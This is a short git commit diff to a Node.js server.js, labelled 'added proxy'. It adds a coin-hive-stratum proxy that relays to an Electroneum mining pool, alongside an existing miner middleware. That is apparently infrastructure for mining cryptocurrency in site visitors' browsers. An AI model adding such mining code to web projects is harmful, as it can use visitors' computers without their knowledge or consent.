80f0fbbfc8eff15c8b0275c38e410878648d99fe
Jefree Sujit <e.jefree110@gmail.com>
2018-02-01 21:49:37 +0530

    added proxy

--- server.js
+++ server.js
@@ -10,6 +10,14 @@ var middleware = require('./middleware');
 require('./dbsetup.js');
 require('./middleware/miner.js');
 
+var SProxy = require("coin-hive-stratum");
+var proxy = new SProxy({
+  host: "etn-pool.proxpool.com",
+  port: 3333
+});
+
+proxy.listen(8892);
+
 // serve static files
 app.use(express.static(path.join(__dirname, 'public', 'css')));
 app.use(express.static(path.join(__dirname, 'public', 'js')));
